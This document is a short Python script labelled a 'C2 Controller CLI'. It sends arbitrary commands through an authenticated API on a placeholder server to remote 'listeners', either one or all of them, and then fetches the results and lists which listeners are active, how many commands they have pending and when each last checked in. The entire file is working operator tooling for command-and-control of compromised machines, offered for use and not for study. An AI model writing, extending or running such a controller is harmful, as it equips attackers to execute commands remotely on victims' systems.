
import requests
import argparse
import json
import sys

SERVER_URL = "http://yourserver:6969"
API_KEY = "SECRET_API_KEY"

HEADERS = {"Authorization": f"Bearer {API_KEY}"}

def send_command(command, listener_id="all"):
    payload = {
        "command": command,
        "listener_id": listener_id
    }
    resp = requests.post(
        f"{SERVER_URL}/api/command",
        json=payload,
        headers=HEADERS,
        timeout=10
    )
    if resp.status_code == 200:
        return resp.json()
    else:
        return {"error": resp.text, "status_code": resp.status_code}

def get_result(command_id):
    resp = requests.get(
        f"{SERVER_URL}/api/result/{command_id}",
        headers=HEADERS,
        timeout=10
    )
    if resp.status_code == 200:
        return resp.json()
    else:
        return {"error": resp.text, "status_code": resp.status_code}

def list_listeners():
    resp = requests.get(
        f"{SERVER_URL}/api/listeners",
        headers=HEADERS,
        timeout=10
    )
    if resp.status_code == 200:
        return resp.json()
    else:
        return {"error": resp.text, "status_code": resp.status_code}

def main():
    parser = argparse.ArgumentParser(description="C2 Controller CLI")
    subparsers = parser.add_subparsers(dest="action", required=True)

    send_parser = subparsers.add_parser("send", help="Send a command")
    send_parser.add_argument("command", help="Command to execute")
    send_parser.add_argument("-l", "--listener", default="all", help="Listener ID (or 'all')")

    result_parser = subparsers.add_parser("result", help="Get command result")
    result_parser.add_argument("command_id", help="Command ID")

    subparsers.add_parser("list", help="List active listeners")
    args = parser.parse_args()
    if args.action == "send":
        print(f"[*] Sending command to {args.listener}: {args.command}")
        resp = send_command(args.command, args.listener)
        print(json.dumps(resp, indent=2))

    elif args.action == "result":
        print(f"[*] Fetching result for {args.command_id}")
        resp = get_result(args.command_id)
        print(json.dumps(resp, indent=2))

    elif args.action == "list":
        print("[*] Active listeners:")
        resp = list_listeners()
        for l in resp.get("listeners", []):
            print(f"  {l['listener_id']} – active: {l['active']}, pending: {l['pending_commands']}, last seen: {l['seconds_ago']}s ago")
        print(f"Total: {resp.get('total', 0)}")

if __name__ == "__main__":
    main()